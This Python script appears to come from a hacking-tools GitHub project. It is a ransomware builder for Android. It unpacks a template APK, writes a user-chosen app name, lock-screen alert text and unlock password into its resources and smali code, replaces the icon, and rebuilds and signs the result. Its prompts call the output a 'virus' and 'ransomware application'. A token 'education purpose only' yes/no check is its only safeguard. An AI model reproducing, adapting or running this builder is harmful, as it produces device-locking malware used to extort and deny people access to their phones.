#! /usr/bin/env python3
#Youtube channel : https://www.youtube.com/channel/UCDWhaLh7OIKzH4Bk952l7Iw
#Github ( coded by vaimpier ritik x SARA ) >>> : https://github.com/VaimpierOfficial x https://github-dotcom.gateway.web.tr/termuxhackers-id/SARA
#For business : sonuv0085@gmail.com
#vaimpier
#=====================================================================================================================
#--
#--welcome dear :)


import os, sys, time, fileinput
from getpass import getpass
from PIL import Image
from shutil import which

r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
B = "\033[1;44m"
w = "\033[0m"


app_icon = ""
app_name = ""
alert_title = ""
alert_desc = ""
key_pass = ""


logo = """\033[33m

 ▄█    █▄     ▄████████  ▄█    ▄▄▄▄███▄▄▄▄      ▄████████    ▄████████   ▄▄▄▄███▄▄▄▄      ▄████████  ▄██████▄    ▄▄▄▄███▄▄▄▄   
███    ███   ███    ███ ███  ▄██▀▀▀███▀▀▀██▄   ███    ███   ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███ ███    ███ ▄██▀▀▀███▀▀▀██▄ 
███    ███   ███    ███ ███▌ ███   ███   ███   ███    ███   ███    ███ ███   ███   ███   ███    █▀  ███    ███ ███   ███   ███ 
███    ███   ███    ███ ███▌ ███   ███   ███  ▄███▄▄▄▄██▀   ███    ███ ███   ███   ███   ███        ███    ███ ███   ███   ███ 
███    ███ ▀███████████ ███▌ ███   ███   ███ ▀▀███▀▀▀▀▀   ▀███████████ ███   ███   ███ ▀███████████ ███    ███ ███   ███   ███ 
███    ███   ███    ███ ███  ███   ███   ███ ▀███████████   ███    ███ ███   ███   ███          ███ ███    ███ ███   ███   ███ 
███    ███   ███    ███ ███  ███   ███   ███   ███    ███   ███    ███ ███   ███   ███    ▄█    ███ ███    ███ ███   ███   ███ 
 ▀██████▀    ███    █▀  █▀    ▀█   ███   █▀    ███    ███   ███    █▀   ▀█   ███   █▀   ▄████████▀   ▀██████▀   ▀█   ███   █▀  
                                               ███    ███                                                                      

                                    \033[34m[✔] https://github.com/VaimpierOfficial    [✔]
                                    \033[34m[✔]            Version 1.0                 [✔]
                                    \033[91m[X] Please Don't Use For illegal Activity  [X]
\033[97m """



def banner():
    print(logo)


def writefile(file,old,new):
    while True:
        if os.path.isfile(file):
            replaces = {old:new}
            for line in fileinput.input(file, inplace=True):
                for search in replaces:
                    replaced = replaces[search]
                    line = line.replace(search,replaced)
                print(line, end="")
            break
        else: exit(r+"[!]"+w+" Failed to write in file "+file)

def signer(apk):
    while True:
        if os.path.isfile(apk):
            if not os.path.isfile("debug.jks"): exit(r+"[!}"+w+" Keystore file 'debug.jks' not found")
            if not os.path.isfile("ubersigner.jar"): os.system("wget -O ubersigner.jar -q https://github.com/patrickfav/uber-apk-signer/releases/download/v1.2.1/uber-apk-signer-1.2.1.jar")
            os.system(f"java -jar ubersigner.jar -a {apk} --ks keystore.jks --ksAlias debugging --ksPass debugging --ksKeyPass debugging > /dev/null 2>&1")
            os.system(f"java -jar ubersigner.jar -a {apk} --onlyVerify > /dev/null 2>&1")
            print("I: Siging final APK's ...")
            break
        else: exit()

def start():
    global app_icon, app_name, alert_title, alert_desc, key_pass
    os.system("clear")
    banner()
    print(r+"[!]"+w+" Education purpose only ? ")
    ask = str(input(r+"[!]"+w+" Do you agree (y/n): ").lower())
    if ask in ("yes"): pass
    else: exit(r+"[!]"+w+" illegel purpose you can not use this tool sorry  !!!")
    print(f"""{d}If you forgot the unlock key then restart your phone !{w}""")
    
    while True:
        x = str(input(w+"* Icon Path (PNG only): "+g))
        if os.path.isfile(x):
            if ".png" in x:
                app_icon = x
                break
            else: print(r+"[!]"+w+" File not accepted, PNG format only !")
        else: print(r+"[!]"+w+" File not found, please fill correctly !")
    while True:
        x = str(input(w+"* Give Virus Name : "+g))
        if len(x) != 0:
            app_name = x
            break
        else: continue
    while True:
        x = str(input(w+"* Give Virus Title : "+g))
        if len(x) != 0:
            alert_title = x
            break
        else: continue
    while True:
        x = str(input(w+"* Give Virus Description : "+g))
        if len(x) != 0:
            alert_desc = x
            break
        else: continue
    while True:
        x = str(input(w+"* Give Password : "+g))
        if len(x) != 0:
            key_pass = x
            break
        else: continue
    print(w+"* Building your ransomware application ...")
    print(w+"-"*43+d)
    os.system("apktool d vaimpier.apk")
    imgpath = [
        "vaimpier/res/drawable-mdpi-v4/ic_launcher.png",
        "vaimpier/res/drawable-xhdpi-v4/ic_launcher.png",
        "vaimpier/res/drawable-hdpi-v4/ic_launcher.png",
        "vaimpier/res/drawable-xxhdpi-v4/ic_launcher.png",
    ]
    strings = "vaimpier/res/values/strings.xml"
    print("I: Using strings "+strings)
    smali = os.popen(f"find -O3 -L vaimpier/ -name '*0000.smali'","r").readline().strip()
    print("I: Using smali "+os.path.basename(smali))
    writefile(strings,"appname",app_name)
    print("I: Adding name with "+app_name)
    writefile(strings,"alert_title",alert_title)
    print("I: Adding title with "+alert_title)
    writefile(strings,"alert_desc",alert_desc)
    print("I: Adding description with "+str(len(alert_desc))+" words")
    writefile(smali,"key_pass",key_pass)
    print("I: Adding unlock key with "+key_pass)
    time.sleep(3)
    for path in imgpath:
        if os.path.isfile(path):
            with Image.open(path) as target:
                width, height = target.size
                size = str(width)+"x"+str(height)
                logo = os.path.basename(app_icon)
                os.system("cp -R "+app_icon+" "+logo)
                os.system("mogrify -resize "+size+" "+logo+";cp -R "+logo+" "+path)
                os.system("rm -rf "+logo)
                print("I: Adding icon with "+os.path.basename(app_icon)+" size: "+size)
        else: exit(1)
    os.system("apktool b vaimpier -o final.apk;rm -rf vaimpier")
    os.system("java -jar ubersigner.jar -a final.apk --ks debug.jks --ksAlias debugging --ksPass debugging --ksKeyPass debugging > /dev/null 2>&1")
    os.system("java -jar ubersigner.jar -a final.apk --onlyVerify > /dev/null 2>&1")
    os.system("rm -rf final.apk")
    if os.path.isfile("final-aligned-signed.apk"):
        out = app_name.replace(" ","").lower() + ".apk"
        os.system("mv final-aligned-signed.apk APKS/"+out)
        #getpass(b+">"+w+" Sucessfully saved as:  "+B+" "+out+" "+w)
	    #os.system("bash link.sh")
	    #getpass(b+">"+w+" Done ")
    else: print(r+"[!]"+w+" Failed to signed APK's")
    
    
    
if __name__ == "__main__":
    try:
        start()
    except KeyboardInterrupt:
        exit(r+"\n[!]"+w+" Thanks for Using this tools\n    follow us \033[4mhttps://github.com/VaimpierOfficial\033[0m\n    bye..bye...")
